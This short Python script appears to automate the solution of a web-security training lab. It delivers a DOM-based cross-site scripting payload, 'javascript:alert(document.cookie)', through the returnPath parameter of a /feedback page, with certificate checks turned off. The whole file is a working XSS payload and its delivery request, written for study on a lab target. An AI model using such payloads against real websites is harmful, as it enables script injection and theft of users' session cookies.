from ...utils import *
from urllib.parse import urljoin

import requests

def solve_lab(url, proxies):
    url = urljoin(url, "/feedback")
    params = {"returnPath": "javascript:alert(document.cookie)"}
    print_info(
        f'Performing DOM-based XSS attack by visiting "{url}" with the following parameters:'
    )
    print(params)

    requests.get(url, params=params, proxies=proxies, verify=False)
    print_success("DOM-based XSS attack performed.\n")

